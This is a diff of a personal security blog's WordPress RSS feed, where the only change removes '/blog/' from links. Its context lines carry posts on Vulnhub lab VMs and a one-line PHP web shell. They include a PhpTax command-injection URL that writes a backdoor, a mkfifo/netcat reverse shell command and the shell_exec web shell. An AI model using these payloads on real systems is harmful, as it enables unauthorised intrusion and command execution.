@@ -9,8 +9,8 @@
 
 <channel>
 	<title>PHP &#8211; Graeme Robinson&#039;s blog</title>
-	<atom:link href="/blog/category/php/feed/" rel="self" type="application/rss+xml" />
-	<link>/blog/</link>
+	<atom:link href="/category/php/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
 	<description>A place for my thoughts when I was starting to break into the information security feild</description>
 	<lastBuildDate>Wed, 30 Oct 2024 17:15:23 +0000</lastBuildDate>
 	<language>en-US</language>
@@ -21,7 +21,7 @@
 	<generator>https://wordpress.org/?v=6.6.2</generator>
 	<item>
 		<title>FristiLeaks 1.3</title>
-		<link>/blog/fristileaks-1-3/</link>
+		<link>/fristileaks-1-3/</link>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Sun, 22 Oct 2017 11:29:27 +0000</pubDate>
@@ -35,10 +35,10 @@
 		<category><![CDATA[Shell]]></category>
 		<category><![CDATA[Unix]]></category>
 		<category><![CDATA[Web Server]]></category>
-		<guid isPermaLink="false">/blog/?p=321</guid>
+		<guid isPermaLink="false">/?p=321</guid>
 
-					<description><![CDATA[Following on from my previous post about Kioptrix 2014, this post will be about how I got root on the next VM in the list, which is FristiLeaks 1.3 So the first thing I did after turning the VM on &#8230; <a href="/blog/fristileaks-1-3/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
-										<content:encoded><![CDATA[<p>Following on from <a href="/blog/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+					<description><![CDATA[Following on from my previous post about Kioptrix 2014, this post will be about how I got root on the next VM in the list, which is FristiLeaks 1.3 So the first thing I did after turning the VM on &#8230; <a href="/fristileaks-1-3/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
 <p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
 <pre>root@kali:~# nmap -A [IP-REDACTED]
 
@@ -108,8 +108,8 @@ print cryptoresult</pre>
 			</item>
 		<item>
 		<title>Kioptrix 2014</title>
-		<link>/blog/kioptrix-2014/</link>
-					<comments>/blog/kioptrix-2014/#comments</comments>
+		<link>/kioptrix-2014/</link>
+					<comments>/kioptrix-2014/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Thu, 12 Oct 2017 20:48:43 +0000</pubDate>
@@ -121,9 +121,9 @@ print cryptoresult</pre>
 		<category><![CDATA[Uncategorized]]></category>
 		<category><![CDATA[Unix]]></category>
 		<category><![CDATA[Web Server]]></category>
-		<guid isPermaLink="false">/blog/?p=312</guid>
+		<guid isPermaLink="false">/?p=312</guid>
 
-					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/blog/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
 <p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
 <p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
@@ -182,7 +182,7 @@ PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/
 phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
 PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
 ------------------------------------------------------------------ ----------------------------------</pre>
-<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/blog/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
+<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
 <p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
 <pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
 <p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
@@ -218,15 +218,15 @@ root</pre>
 <p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/blog/kioptrix-2014/feed/</wfw:commentRss>
+					<wfw:commentRss>/kioptrix-2014/feed/</wfw:commentRss>
 			<slash:comments>1</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>My first pentest on a friend&#8217;s network</title>
-		<link>/blog/my-first-pentest-on-a-friends-network/</link>
-					<comments>/blog/my-first-pentest-on-a-friends-network/#comments</comments>
+		<link>/my-first-pentest-on-a-friends-network/</link>
+					<comments>/my-first-pentest-on-a-friends-network/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Sun, 06 Jan 2013 16:31:58 +0000</pubDate>
@@ -240,9 +240,9 @@ root</pre>
 		<category><![CDATA[Unix]]></category>
 		<category><![CDATA[Web Server]]></category>
 		<category><![CDATA[WebApp]]></category>
-		<guid isPermaLink="false">/blog/?p=227</guid>
+		<guid isPermaLink="false">/?p=227</guid>
 
-					<description><![CDATA[Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that &#8230; <a href="/blog/my-first-pentest-on-a-friends-network/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that &#8230; <a href="/my-first-pentest-on-a-friends-network/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that were not password protected running out of their home public IP address.</p>
 <p>I saw them over the Christmas/new year period and they gave me permission to try and penetrate their network, specifically they challenged me to change the root password on their unRAID server.</p>
 <p>I started off by firing up my Backtrack 5r3 VM and updating everything before registering Nessus and performing a scan of his public IP address.</p>
@@ -260,15 +260,15 @@ root</pre>
 <p>I&#8217;m tempted to try and create a VM with this vulnerable setup and release it. I would have to check the licences, but I think most of it could be done using open source solutions (linux, apache, sabnzbd, transmission)</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/blog/my-first-pentest-on-a-friends-network/feed/</wfw:commentRss>
+					<wfw:commentRss>/my-first-pentest-on-a-friends-network/feed/</wfw:commentRss>
 			<slash:comments>9</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Exploit Exercises – Nebula – Level 05</title>
-		<link>/blog/exploit-exercises-nebula-level-05/</link>
-					<comments>/blog/exploit-exercises-nebula-level-05/#respond</comments>
+		<link>/exploit-exercises-nebula-level-05/</link>
+					<comments>/exploit-exercises-nebula-level-05/#respond</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Thu, 29 Nov 2012 23:44:00 +0000</pubDate>
@@ -279,9 +279,9 @@ root</pre>
 		<category><![CDATA[PHP]]></category>
 		<category><![CDATA[Shell]]></category>
 		<category><![CDATA[Unix]]></category>
-		<guid isPermaLink="false">/blog/?p=210</guid>
+		<guid isPermaLink="false">/?p=210</guid>
 
-					<description><![CDATA[Not much information to start on this one: Check the flag05 home directory. You are looking for weak directory permissions To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05. The command &#8230; <a href="/blog/exploit-exercises-nebula-level-05/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[Not much information to start on this one: Check the flag05 home directory. You are looking for weak directory permissions To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05. The command &#8230; <a href="/exploit-exercises-nebula-level-05/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>Not much information to start on this one:</p>
 <p style="padding-left: 30px;">Check the <em>flag05</em> home directory. You are looking for weak directory permissions<br />
 To do this level, log in as the <em>level05</em> account with the password <em>level05</em> . Files for this level can be found in /home/flag05.</p>
@@ -292,15 +292,15 @@ To do this level, log in as the <em>level05</em> account with the password <e
 <p>Bingo!</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/blog/exploit-exercises-nebula-level-05/feed/</wfw:commentRss>
+					<wfw:commentRss>/exploit-exercises-nebula-level-05/feed/</wfw:commentRss>
 			<slash:comments>0</slash:comments>
 		
 		
 			</item>
 		<item>
 		<title>Single Line PHP Script to Gain Shell</title>
-		<link>/blog/single-line-php-script-to-gain-shell/</link>
-					<comments>/blog/single-line-php-script-to-gain-shell/#comments</comments>
+		<link>/single-line-php-script-to-gain-shell/</link>
+					<comments>/single-line-php-script-to-gain-shell/#comments</comments>
 		
 		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
 		<pubDate>Sun, 23 Sep 2012 21:48:19 +0000</pubDate>
@@ -311,9 +311,9 @@ To do this level, log in as the <em>level05</em> account with the password <e
 		<category><![CDATA[Shell]]></category>
 		<category><![CDATA[Web Server]]></category>
 		<category><![CDATA[WebApp]]></category>
-		<guid isPermaLink="false">/blog/?p=79</guid>
+		<guid isPermaLink="false">/?p=79</guid>
 
-					<description><![CDATA[A while ago, on PaulDotCom Security Weekly, I heard someone mention something about a single line php script to get shell on the web server. I knew it couldn&#8217;t be that hard as it&#8217;s only one line, but I didn&#8217;t find much about &#8230; <a href="/blog/single-line-php-script-to-gain-shell/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+					<description><![CDATA[A while ago, on PaulDotCom Security Weekly, I heard someone mention something about a single line php script to get shell on the web server. I knew it couldn&#8217;t be that hard as it&#8217;s only one line, but I didn&#8217;t find much about &#8230; <a href="/single-line-php-script-to-gain-shell/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
 										<content:encoded><![CDATA[<p>A while ago, on <a title="PaulDotCom" href="http://pauldotcom.com/" target="_blank" rel="noopener">PaulDotCom</a> Security Weekly, I heard someone mention something about a single line php script to get shell on the web server. I knew it couldn&#8217;t be that hard as it&#8217;s only one line, but I didn&#8217;t find much about it on google when I searched, perhaps because it&#8217;s too easy, or perhaps I was using the wrong search terms. Anyway, I forgot about it for a while&#8230; until now.</p>
 <p>Since WebApp security is what I&#8217;m most interested in at the moment, I have been learning PHP, I&#8217;m not finished learning yet, but today (while reading about how inputs should be sanitised before using &#8220;include&#8221;) I remembered the single line PHP shell, and I had a go and this is what I came up with:</p>
 <pre lang="PHP"><?php echo shell_exec($_GET['e'].' 2>&1'); ?></pre>
@@ -331,7 +331,7 @@ To do this level, log in as the <em>level05</em> account with the password <e
 <p>The last command even showed me some files and their owners which in turn (because I am using a shared host) told me the names of some of the other sites are that are running on the same server as mine, which was an unexpected &#8220;bonus&#8221; find.</p>
 ]]></content:encoded>
 					
-					<wfw:commentRss>/blog/single-line-php-script-to-gain-shell/feed/</wfw:commentRss>
+					<wfw:commentRss>/single-line-php-script-to-gain-shell/feed/</wfw:commentRss>
 			<slash:comments>4</slash:comments>
 		
 		
